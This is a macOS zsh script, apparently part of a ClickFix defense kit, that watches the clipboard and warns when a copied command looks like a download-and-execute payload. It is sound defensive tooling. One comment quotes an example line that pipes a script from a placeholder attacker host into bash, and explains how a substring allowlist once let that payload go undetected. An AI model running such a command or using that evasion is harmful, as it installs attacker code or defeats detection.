#!/bin/zsh
# ==============================================================================
# clipsentinel.sh — macOS clipboard watchdog for the ClickFix Defense Kit
# ==============================================================================
#
# WHY THIS EXISTS
#   ClickFix / FakeCAPTCHA attacks work by SILENTLY copying a malicious shell
#   command to your clipboard, then telling you (via a fake "verify you are
#   human" page) to open Terminal and paste it. The dangerous moment is the
#   PASTE. This watcher fires the *earliest possible* warning: the instant the
#   dangerous text is COPIED, before it ever reaches a terminal.
#
#   It is a COMPANION to ShellGuard (the zsh accept-line guard). ShellGuard does
#   the authoritative blocking at EXECUTE time. ClipSentinel is advisory only —
#   a clipboard watcher physically cannot stop a paste (there is no macOS API
#   for that). It warns; it does not block. Treat it as a smoke alarm, not a
#   sprinkler.
#
# HOW IT WORKS
#   Polls `pbpaste` once per second. Hashes the current clipboard text and
#   compares to the last-seen hash, so we only inspect on a genuine *change*
#   (the same cheap "changeCount-style" discipline, done in pure shell). When
#   newly-copied text matches the ClickFix shell grammar, it raises a macOS
#   notification (and optionally a modal dialog) via osascript.
#
#   CPU cost is negligible: one pbpaste + one sha on a short string per second.
#
# NO EXTERNAL DEPENDENCIES — uses only pbpaste, shasum/md5, and osascript, all
# shipped with macOS.
#
# CONFIG (environment variables, all optional)
#   CLIPSENTINEL_INTERVAL   poll interval in seconds (default 1)
#   CLIPSENTINEL_DIALOG     "1" to also raise a blocking modal dialog (default 0,
#                           notification only — less intrusive)
#   CLIPSENTINEL_LOG        path to an append-only event log (default: none)
#   CLIPSENTINEL_DISABLE    "1" to make this script exit immediately (kill switch)
#
# DEFENSIVE-USE ONLY. This tool detects and warns about download-and-execute
# patterns so a human is not tricked into running them. It does not run, store,
# or transmit clipboard contents anywhere.
# ==============================================================================

emulate -L zsh
setopt no_unset pipe_fail

# ---- Kill switch -------------------------------------------------------------
if [[ "${CLIPSENTINEL_DISABLE:-0}" == "1" ]]; then
  print -r -- "[clipsentinel] CLIPSENTINEL_DISABLE=1 — exiting." >&2
  exit 0
fi

# ---- Tunables ----------------------------------------------------------------
typeset -i INTERVAL=${CLIPSENTINEL_INTERVAL:-1}
(( INTERVAL < 1 )) && INTERVAL=1
typeset DIALOG="${CLIPSENTINEL_DIALOG:-0}"
typeset LOGFILE="${CLIPSENTINEL_LOG:-}"

# ---- Required tools ----------------------------------------------------------
# pbpaste and osascript are mandatory and ship with macOS. Fail loudly if not
# on macOS (e.g. someone ran this on Linux by mistake).
if ! command -v pbpaste >/dev/null 2>&1; then
  print -r -- "[clipsentinel] FATAL: pbpaste not found — this tool is macOS-only." >&2
  exit 1
fi
if ! command -v osascript >/dev/null 2>&1; then
  print -r -- "[clipsentinel] FATAL: osascript not found — this tool is macOS-only." >&2
  exit 1
fi

# Pick whatever hashing tool exists. We only need change-detection, not
# cryptographic strength, so md5 is fine as a fallback.
if command -v shasum >/dev/null 2>&1; then
  _hash() { shasum -a 256 | cut -d' ' -f1; }
elif command -v md5 >/dev/null 2>&1; then
  _hash() { md5 -q; }
else
  _hash() { cksum | cut -d' ' -f1; }
fi

# ==============================================================================
# DANGEROUS-PATTERN MATCHER
#
# As of v0.1.1 the grammar is NOT defined here. ClipSentinel and ShellGuard both
# source ../lib/clickfix-grammar.zsh, so the copy-time and execute-time layers
# are the same code and cannot disagree.
#
# They used to. v0.1.0's README claimed this matcher was "kept deliberately in
# lockstep with ShellGuard's grammar"; a red-team pass found the two layers
# disagreeing on 6 of 13 payloads. Worse, the old _is_allowlisted was a bare
# SUBSTRING test against the whole clipboard buffer, and its list contained the
# token 'install.sh' — so `curl https://<attacker>/get4/install.sh | bash`, the
# shape in published AMOS IOCs, was suppressed entirely. A ClickFix page
# controls the exact clipboard bytes, so that was a guaranteed one-token
# silencing of this whole tool. Trust is now scheme+host+path-prefix, in one
# shared file, asserted by ../tests/corpus.tsv on every commit.
# ==============================================================================

_CLIPSENTINEL_DIR=${${(%):-%x}:A:h}
_CLICKFIX_GRAMMAR_PATH=${CLICKFIX_GRAMMAR_PATH:-${_CLIPSENTINEL_DIR:h}/lib/clickfix-grammar.zsh}

if [[ ! -r $_CLICKFIX_GRAMMAR_PATH ]]; then
  print -u2 -- "[clipsentinel] FATAL: cannot read ${_CLICKFIX_GRAMMAR_PATH}"
  print -u2 -- "[clipsentinel] refusing to run — a watchdog that silently matches nothing is worse than none."
  exit 1
fi
source "$_CLICKFIX_GRAMMAR_PATH" || {
  print -u2 -- "[clipsentinel] FATAL: grammar failed to load — refusing to run."
  exit 1
}

# Returns 0 (true) if the clipboard text should raise an alert.
# ClipSentinel alerts on both the 'block' and 'warn' tiers: at copy time there
# is no confirmation to gate, only awareness to offer, and a heads-up costs the
# user nothing but a banner.
_is_dangerous() {
  clickfix_check "$1"
  [[ $CLICKFIX_VERDICT != silent ]]
}

# ==============================================================================
# NOTIFY
#
# Two surfaces:
#   1. Always: a macOS notification banner with a distinct alarming sound
#      (Basso) so the warning is felt, not just seen.
#   2. Optional (CLIPSENTINEL_DIALOG=1): a modal "display dialog" that the user
#      must dismiss. More intrusive; off by default to avoid alert fatigue.
#
# We pass the clipboard text to osascript via argv ("$1" of the AppleScript),
# NOT by interpolating it into the script source — that avoids AppleScript
# string-injection from crafted clipboard content. We also show only a short,
# clearly-truncated preview.
# ==============================================================================
_notify() {
  local preview="$1"

  # Truncate to a short, safe preview (single line, max ~120 chars).
  preview="${preview//$'\n'/ }"
  preview="${preview//$'\r'/ }"
  if (( ${#preview} > 120 )); then
    preview="${preview[1,117]}..."
  fi

  # Notification banner. `with title`/`subtitle` are static strings we control;
  # the untrusted clipboard preview is passed as a parameter (item 1 of argv)
  # and concatenated INSIDE AppleScript, so shell/AppleScript metacharacters in
  # the clipboard cannot break out.
  /usr/bin/osascript \
    - "$preview" <<'APPLESCRIPT' >/dev/null 2>&1
on run argv
  set thePreview to item 1 of argv
  display notification ("Do NOT paste into Terminal: " & thePreview) ¬
    with title "⚠️ ClipSentinel: dangerous shell command copied" ¬
    subtitle "ClickFix attack pattern detected on your clipboard" ¬
    sound name "Basso"
end run
APPLESCRIPT

  # Optional blocking modal.
  if [[ "$DIALOG" == "1" ]]; then
    /usr/bin/osascript \
      - "$preview" <<'APPLESCRIPT' >/dev/null 2>&1
on run argv
  set thePreview to item 1 of argv
  display dialog ("A download-and-execute command was just copied to your clipboard:" & return & return & thePreview & return & return & "This is the signature of a ClickFix / FakeCAPTCHA scam. Do NOT paste it into Terminal unless you typed it yourself and trust the source.") ¬
    with title "⚠️ ClipSentinel — possible ClickFix attack" ¬
    with icon caution ¬
    buttons {"I understand"} default button "I understand"
end run
APPLESCRIPT
  fi
}

# Append an event to the log if a logfile is configured. We log the PREVIEW
# only (truncated), with a timestamp — never the full payload, never anywhere
# off-machine.
#
# v0.1.0 logged a 117-character PREVIEW of the copied text, which contained the
# attacker URL — while the README said contents "are never stored or sent
# anywhere," and the shipped LaunchAgent set CLIPSENTINEL_LOG by default. So
# the tool's own log was a plaintext record of everything dangerous the user
# ever copied. It now records only the verdict, the reason, and a truncated
# hash: enough to correlate two events as the same payload, never enough to
# recover the payload. The README now matches this behaviour.
_log_event() {
  [[ -z "$LOGFILE" ]] && return 0
  local digest
  digest="$(print -r -- "$1" | _hash)"
  print -r -- "$(date '+%Y-%m-%dT%H:%M:%S%z')  ${(U)CLICKFIX_VERDICT}  sha256:${digest[1,12]}  ${CLICKFIX_REASONS[1]:-unclassified}" \
    >> "$LOGFILE" 2>/dev/null || true
}

# ==============================================================================
# MAIN LOOP
# ==============================================================================
print -r -- "[clipsentinel] watching clipboard (interval=${INTERVAL}s, dialog=${DIALOG}). Ctrl-C to stop." >&2

typeset last_hash=""
typeset cur cur_hash

# Seed last_hash with whatever is already on the clipboard at startup, WITHOUT
# alerting — we only want to fire on NEW copies after we start, not on whatever
# was there before.
cur="$(pbpaste 2>/dev/null || true)"
last_hash="$(print -r -- "$cur" | _hash)"

while true; do
  # Re-check the kill switch each loop so it can be toggled live via env on a
  # respawn (and so a future control file could flip it).
  if [[ "${CLIPSENTINEL_DISABLE:-0}" == "1" ]]; then
    print -r -- "[clipsentinel] CLIPSENTINEL_DISABLE=1 — exiting." >&2
    exit 0
  fi

  cur="$(pbpaste 2>/dev/null || true)"
  cur_hash="$(print -r -- "$cur" | _hash)"

  # Only inspect on an actual clipboard CHANGE. This is the cheap path: most
  # loop iterations do nothing beyond a hash comparison.
  if [[ "$cur_hash" != "$last_hash" ]]; then
    last_hash="$cur_hash"

    # Trust is decided inside clickfix_check: a command whose every URL is a
    # known single-tenant installer (or an allowlisted host+path prefix)
    # returns 'silent', so there is no separate allowlist step to get wrong.
    if [[ -n "$cur" ]] && _is_dangerous "$cur"; then
      _notify "$cur"
      _log_event "$cur"
    fi
  fi

  sleep "$INTERVAL"
done
